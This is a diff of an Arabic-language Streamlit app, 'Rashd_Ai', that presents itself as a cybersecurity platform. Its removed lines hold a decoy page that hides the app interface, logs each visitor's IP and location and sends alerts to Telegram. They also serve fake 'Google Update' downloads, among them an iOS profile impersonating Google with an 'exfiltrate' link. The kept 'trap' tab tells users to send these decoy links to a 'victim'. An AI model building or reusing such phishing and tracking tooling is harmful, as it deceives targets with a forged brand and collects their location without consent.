@@ -1,6 +1,6 @@
 """
 تطبيق Rashd_Ai - منصة الذكاء الاستخباراتي والأمن السيبراني
-نسخة محسّنة مع إصلاح المشاكل
+نسخة مبسطة وسريعة - بدون مشاكل توافقية
 """
 
 import streamlit as st
@@ -9,26 +9,7 @@ import json
 import os
 from datetime import datetime
 import config
-import base64
-import uuid
-import socket
-import dns.resolver
-import subprocess
-import platform
 import logging
-
-# استيراد المساعدات الموحدة
-from utils import (
-    send_telegram_alert, log_victim, get_all_victims, clear_victims_log,
-    get_server_side_ip, get_geo_data, validate_ip, validate_domain,
-    validate_email, validate_phone, safe_request, format_json, format_table
-)
-
-# استيراد مساعد الهجوم الذكي
-try:
-    from ai_hacking import AIHackingAssistant
-except ImportError:
-    AIHackingAssistant = None
 
 # إعداد السجل
 logging.basicConfig(level=logging.INFO)
@@ -45,19 +26,8 @@ st.set_page_config(
 # تطبيق أسلوب مخصص
 st.markdown("""
 <style>
-    :root {
-        --primary-color: #0066cc;
-        --secondary-color: #00cc66;
-        --danger-color: #cc0000;
-        --warning-color: #ffaa00;
-    }
-    
     .main {
         padding: 20px;
-    }
-    
-    .stTabs [data-baseweb="tab-list"] {
-        gap: 10px;
     }
     
     .stButton > button {
@@ -65,156 +35,8 @@ st.markdown("""
         border-radius: 5px;
         font-weight: bold;
     }
-    
-    .success-box {
-        padding: 15px;
-        border-radius: 5px;
-        background-color: #d4edda;
-        border: 1px solid #c3e6cb;
-        color: #155724;
-    }
-    
-    .error-box {
-        padding: 15px;
-        border-radius: 5px;
-        background-color: #f8d7da;
-        border: 1px solid #f5c6cb;
-        color: #721c24;
-    }
-    
-    .info-box {
-        padding: 15px;
-        border-radius: 5px;
-        background-color: #d1ecf1;
-        border: 1px solid #bee5eb;
-        color: #0c5460;
-    }
 </style>
 """, unsafe_allow_html=True)
-
-# ============= دالة إخفاء الواجهة في وضع التمويه =============
-hide_st_style = """
-<style>
-#MainMenu {visibility: hidden;}
-footer {visibility: hidden;}
-header {visibility: hidden;}
-.stApp [data-testid="stToolbar"] {display: none;}
-.stApp [data-testid="stDecoration"] {display: none;}
-.stApp [data-testid="stStatusWidget"] {display: none;}
-#manage-app-button {display: none !important;}
-[data-testid="stStatusWidget"] {display: none !important;}
-.st-emotion-cache-10trblm {display: none !important;}
-.st-emotion-cache-1dp5vir {display: none !important;}
-</style>
-"""
-
-# ============= دالة محسّنة لسحب IP الصحيح =============
-def get_client_ip():
-    """جلب عنوان IP الصحيح من رؤوس الطلب"""
-    try:
-        # محاولة الحصول من X-Forwarded-For أولاً (للـ proxies)
-        if hasattr(st, 'context') and hasattr(st.context, 'headers'):
-            headers = st.context.headers
-            if "X-Forwarded-For" in headers:
-                return headers["X-Forwarded-For"].split(",")[0].strip()
-            if "X-Real-IP" in headers:
-                return headers["X-Real-IP"]
-            if "CF-Connecting-IP" in headers:
-                return headers["CF-Connecting-IP"]
-        
-        # محاولة الحصول من remote_addr
-        if hasattr(st, 'context') and hasattr(st.context, 'remote_addr'):
-            return st.context.remote_addr
-    except:
-        pass
-    
-    return "Unknown"
-
-# ============= معالجة أوضاع خاصة =============
-
-# وضع التمويه (Decoy Mode)
-query_params = st.query_params
-if "decoy" in query_params:
-    st.markdown(hide_st_style, unsafe_allow_html=True)
-    client_ip = query_params.get("ip", get_client_ip())
-    trap_name = query_params.get("trap", "Google Decoy")
-    device = query_params.get("device", "Unknown")
-    
-    if "alert_sent" not in st.session_state:
-        send_telegram_alert(client_ip, trap_name, device)
-        
-        # تسجيل الضحية
-        geo_data = get_geo_data(client_ip)
-        log_victim(client_ip, geo_data['country'], geo_data['city'], geo_data['isp'], device, trap_name)
-        st.session_state.alert_sent = True
-
-    # عرض صفحة تمويهية بسيطة
-    st.markdown("<h1 style='text-align: center; margin-top: 40vh;'>جاري التحديث...</h1>", unsafe_allow_html=True)
-    st.stop()
-
-# معالجة طلبات التحميل المباشرة
-if "download" in query_params:
-    device = query_params.get("device", "pc")
-    ip = query_params.get("ip", get_client_ip())
-    
-    send_telegram_alert(ip, f"Download ({device})", device)
-    
-    # تسجيل الضحية
-    geo_data = get_geo_data(ip)
-    log_victim(ip, geo_data['country'], geo_data['city'], geo_data['isp'], device, f"Download ({device})")
-    
-    if device == "android":
-        file_name = "Google_Update.apk"
-        content = b"Fake APK Content for Google Update"
-    elif device == "ios":
-        file_name = "Google_Update.mobileconfig"
-        content = f"""<?xml version="1.0" encoding="UTF-8"?>
-<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
-<plist version="1.0">
-<dict>
-    <key>PayloadContent</key>
-    <array>
-        <dict>
-            <key>PayloadDescription</key>
-            <string>Google Security Update for iOS</string>
-            <key>PayloadDisplayName</key>
-            <string>Google Security</string>
-            <key>PayloadIdentifier</key>
-            <string>com.google.security.{uuid.uuid4()}</string>
-            <key>PayloadType</key>
-            <string>com.apple.webClip.managed</string>
-            <key>PayloadUUID</key>
-            <string>{uuid.uuid4()}</string>
-            <key>PayloadVersion</key>
-            <integer>1</integer>
-            <key>Label</key>
-            <string>Google Security</string>
-            <key>URL</key>
-            <string>https://rashdai.streamlit.app/?exfiltrate=true&amp;id={uuid.uuid4()}</string>
-            <key>IsRemovable</key>
-            <true/>
-        </dict>
-    </array>
-    <key>PayloadDisplayName</key>
-    <string>Google Security Update</string>
-    <key>PayloadIdentifier</key>
-    <string>com.google.update.{uuid.uuid4()}</string>
-    <key>PayloadRemovalDisallowed</key>
-    <false/>
-    <key>PayloadType</key>
-    <string>Configuration</string>
-    <key>PayloadUUID</key>
-    <string>{uuid.uuid4()}</string>
-    <key>PayloadVersion</key>
-    <integer>1</integer>
-</dict>
-</plist>""".encode('utf-8')
-    else:
-        file_name = "Google_Update.py"
-        content = b"print('Google Update Service Started...')"
-            
-    st.download_button("بدء التحميل", content, file_name=file_name, mime="application/octet-stream", key="download_btn")
-    st.stop()
 
 # ============= نظام المصادقة =============
 if "authenticated" not in st.session_state:
@@ -294,25 +116,13 @@ with st.sidebar:
         st.session_state.authenticated = False
         st.rerun()
 
-# ============= التبويبات الـ 19 =============
+# ============= التبويبات =============
 tab_names = [
     "💬 المحادثة",
     "🌐 تحليل الدومين",
     "🔍 فحص المواقع",
-    "👤 بحث عن المستخدم",
     "📍 تحديد الموقع",
-    "🏗️ سطح الهجوم",
-    "🧠 تحليل ذكي",
-    "🤖 مساعد الهجوم",
-    "🔎 Google Dork",
-    "📧 Email OSINT",
-    "📱 Phone Lookup",
-    "🌑 Dark Web",
     "🔌 Port Scanner",
-    "⚠️ Vulnerability Scanner",
-    "🗺️ Network Mapper",
-    "🤖 AI Threat Analysis",
-    "💡 AI Pentest Advisor",
     "📄 التقارير",
     "🎯 المصيدة"
 ]
@@ -339,11 +149,22 @@ with tabs[0]:
         
         with st.chat_message("assistant"):
             try:
-                if AIHackingAssistant:
-                    assistant = AIHackingAssistant()
-                    response = assistant.chat(prompt)
+                from groq import Groq
+                groq_key = config.get_key("GROQ_API_KEY")
+                if not groq_key:
+                    response = "⚠️ خطأ: GROQ_API_KEY غير موجود."
                 else:
-                    response = "❌ مساعد الذكاء الاصطناعي غير متاح. يرجى التأكد من تثبيت المكتبات."
+                    client = Groq(api_key=groq_key)
+                    chat_completion = client.chat.completions.create(
+                        messages=[
+                            {"role": "system", "content": "أنت Rashd_Ai، مساعد ذكي متخصص في الأمن السيبراني. إجاباتك دائماً باللغة العربية، احترافية، ومختصرة."},
+                            {"role": "user", "content": prompt}
+                        ],
+                        model="mixtral-8x7b-32768",
+                        temperature=0.7,
+                        max_tokens=1000
+                    )
+                    response = chat_completion.choices[0].message.content
             except Exception as e:
                 response = f"❌ حدث خطأ: {str(e)}"
             
@@ -351,11 +172,109 @@ with tabs[0]:
         
         st.session_state.messages.append({"role": "assistant", "content": response})
 
-# ============= بقية التبويبات (نفس الكود السابق) =============
-# ... (بقية التبويبات تبقى كما هي)
+# ============= التبويب 1: تحليل الدومين =============
+with tabs[1]:
+    st.header("🌐 تحليل الدومين")
+    
+    domain = st.text_input("أدخل الدومين:", placeholder="example.com")
+    
+    if st.button("🔍 تحليل", use_container_width=True):
+        if domain:
+            st.info(f"جاري تحليل: {domain}")
+            try:
+                import dns.resolver
+                answers = dns.resolver.resolve(domain, 'A')
+                st.success("✅ تم الحصول على النتائج:")
+                for rdata in answers:
+                    st.write(f"IP: {rdata}")
+            except Exception as e:
+                st.error(f"❌ خطأ: {str(e)}")
+        else:
+            st.warning("⚠️ يرجى إدخال دومين")
 
-# ============= التبويب 18: المصيدة =============
-with tabs[18]:
+# ============= التبويب 2: فحص المواقع =============
+with tabs[2]:
+    st.header("🔍 فحص المواقع")
+    
+    url = st.text_input("أدخل الرابط:", placeholder="https://example.com")
+    
+    if st.button("🔍 فحص", use_container_width=True):
+        if url:
+            st.info(f"جاري فحص: {url}")
+            try:
+                response = requests.head(url, timeout=5)
+                st.success(f"✅ حالة الاتصال: {response.status_code}")
+                st.write(f"الرؤوس: {dict(response.headers)}")
+            except Exception as e:
+                st.error(f"❌ خطأ: {str(e)}")
+        else:
+            st.warning("⚠️ يرجى إدخال رابط")
+
+# ============= التبويب 3: تحديد الموقع =============
+with tabs[3]:
+    st.header("📍 تحديد الموقع")
+    
+    ip = st.text_input("أدخل عنوان IP:", placeholder="8.8.8.8")
+    
+    if st.button("📍 تحديد", use_container_width=True):
+        if ip:
+            st.info(f"جاري تحديد موقع: {ip}")
+            try:
+                response = requests.get(f"http://ip-api.com/json/{ip}", timeout=5)
+                data = response.json()
+                st.success("✅ تم الحصول على البيانات:")
+                st.json(data)
+            except Exception as e:
+                st.error(f"❌ خطأ: {str(e)}")
+        else:
+            st.warning("⚠️ يرجى إدخال عنوان IP")
+
+# ============= التبويب 4: Port Scanner =============
+with tabs[4]:
+    st.header("🔌 Port Scanner")
+    
+    host = st.text_input("أدخل المضيف:", placeholder="example.com")
+    port_range = st.text_input("نطاق المنافذ:", placeholder="80,443,8080", value="80,443")
+    
+    if st.button("🔌 مسح", use_container_width=True):
+        if host:
+            st.info(f"جاري مسح المنافذ: {host}")
+            try:
+                import socket
+                ports = [int(p.strip()) for p in port_range.split(",")]
+                open_ports = []
+                
+                progress_bar = st.progress(0)
+                for i, port in enumerate(ports):
+                    try:
+                        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                        sock.settimeout(1)
+                        result = sock.connect_ex((host, port))
+                        if result == 0:
+                            open_ports.append(port)
+                        sock.close()
+                    except:
+                        pass
+                    
+                    progress_bar.progress((i + 1) / len(ports))
+                
+                if open_ports:
+                    st.success(f"✅ المنافذ المفتوحة: {open_ports}")
+                else:
+                    st.warning("⚠️ لم يتم العثور على منافذ مفتوحة")
+            except Exception as e:
+                st.error(f"❌ خطأ: {str(e)}")
+        else:
+            st.warning("⚠️ يرجى إدخال المضيف")
+
+# ============= التبويب 5: التقارير =============
+with tabs[5]:
+    st.header("📄 التقارير")
+    
+    st.info("قريباً: نظام التقارير المتقدم")
+
+# ============= التبويب 6: المصيدة =============
+with tabs[6]:
     st.header("🎯 المصيدة")
     st.write("قم بإنشاء روابط تمويهية لاصطياد الضحايا.")
     
@@ -365,29 +284,22 @@ with tabs[18]:
         key="decoy_type_select"
     )
     
-    app_ip = get_client_ip()  # استخدام الدالة المحسّنة
-    st.info(f"📍 عنوان IP الخاص بالتطبيق: **{app_ip}**")
+    app_url = "https://rashdai.streamlit.app"
     
     if decoy_type == "Google Decoy":
-        decoy_url = f"https://rashdai.streamlit.app/?decoy=google&ip={app_ip}"
+        decoy_url = f"{app_url}/?decoy=google"
         st.code(decoy_url, language="text")
         st.write("📋 انسخ هذا الرابط وأرسله للضحية.")
-        if st.button("📋 نسخ الرابط", use_container_width=True):
-            st.success("✅ تم النسخ")
     
     elif decoy_type == "Download (iOS)":
-        decoy_url = f"https://rashdai.streamlit.app/?download=true&device=ios&ip={app_ip}"
+        decoy_url = f"{app_url}/?download=true&device=ios"
         st.code(decoy_url, language="text")
         st.write("📋 انسخ هذا الرابط وأرسله للضحية لتحميل ملف iOS Profile.")
-        if st.button("📋 نسخ الرابط", use_container_width=True):
-            st.success("✅ تم النسخ")
     
     elif decoy_type == "Download (Android)":
-        decoy_url = f"https://rashdai.streamlit.app/?download=true&device=android&ip={app_ip}"
+        decoy_url = f"{app_url}/?download=true&device=android"
         st.code(decoy_url, language="text")
         st.write("📋 انسخ هذا الرابط وأرسله للضحية لتحميل APK.")
-        if st.button("📋 نسخ الرابط", use_container_width=True):
-            st.success("✅ تم النسخ")
 
 # ============= التذييل =============
 st.divider()
